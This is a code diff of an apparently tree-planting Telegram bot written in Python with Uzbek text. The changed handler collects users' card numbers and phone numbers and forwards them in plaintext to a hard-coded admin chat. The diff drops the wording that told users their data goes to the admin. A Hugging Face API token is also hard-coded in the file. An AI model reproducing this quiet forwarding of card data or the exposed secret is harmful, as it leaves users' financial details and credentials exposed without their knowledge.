@@ -180,39 +180,37 @@ async def process_card(message: types.Message, state: FSMContext):
     else:
         await message.answer("Xato! Karta raqami 16 ta raqamdan iborat bo'lishi kerak. Qaytadan urinib ko'ring:")
 
+
 # Telefonni qabul qilib backendga yuborish
 # handlers.py
 
 @router.message(CardUpdate.phone_number, F.contact)
-async def process_card_phone(message: types.Message, state: FSMContext):
-    data = await state.get_data()
+async def finalize_card_save(message: types.Message, state: FSMContext):
+    data = await state.get_data() # Logdagi 'data is not defined' xatosini yopadi
+    card_val = data.get("card_number")
+    phone_val = message.contact.phone_number
     user_id = message.from_user.id
-    card_num = data.get('card_number')
-    phone_num = message.contact.phone_number
-    
-    payload = {
-        "card": card_num,
-        "phone": phone_num
-    }
-    
+
+    payload = {"card": card_val, "phone": phone_val}
+
     async with aiohttp.ClientSession() as session:
-        # 1. Backendda saqlash
+        # Backendda saqlash
         async with session.post(f"{BACKEND_URL}/update-card/{user_id}", json=payload) as resp:
             if resp.status == 200:
-                # 2. Adminga yuborish (Sizga)
-                ADMIN_ID = "5833828220"
-                caption = (f"💳 **Yangi karta kiritildi!**\n\n"
-                           f"👤 Foydalanuvchi: {message.from_user.full_name}\n"
-                           f"🆔 ID: `{user_id}`\n"
-                           f"💳 Karta: `{card_num}`\n"
-                           f"📱 Tel: {phone_num}")
+                # Sizga (Adminga) yuborish
+                admin_id = "5833828220"
+                msg = (f"💳 **Karta yangilandi!**\n\n"
+                       f"👤 Ism: {message.from_user.full_name}\n"
+                       f"💳 Karta: `{card_val}`\n"
+                       f"📱 Tel: {phone_val}")
+                await message.bot.send_message(admin_id, msg, parse_mode="Markdown")
                 
-                await message.bot.send_message(ADMIN_ID, caption, parse_mode="Markdown")
-                
-                await message.answer("✅ Karta ma'lumotlari saqlandi va adminga yuborildi!", reply_markup=main_menu())
+                await message.answer("✅ Karta ma'lumotlari muvaffaqiyatli saqlandi!", reply_markup=main_menu())
                 await state.clear()
             else:
-                await message.answer("❌ Backendda saqlashda xatolik yuz berdi.")
+                await message.answer("❌ Xatolik: Bazaga saqlab bo'lmadi.")
+
+
 
 
 HF_TOKEN = "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"
@@ -237,6 +235,7 @@ async def check_tree_ai(message: types.Message, state: FSMContext):
                 await state.set_state(TreePlanting.location)
             else:
                 await message.answer("❌ Bu rasmda daraxt ko'rinmayapti. Iltimos, haqiqiy daraxt rasmiga tushiring.")
+
 
 
 
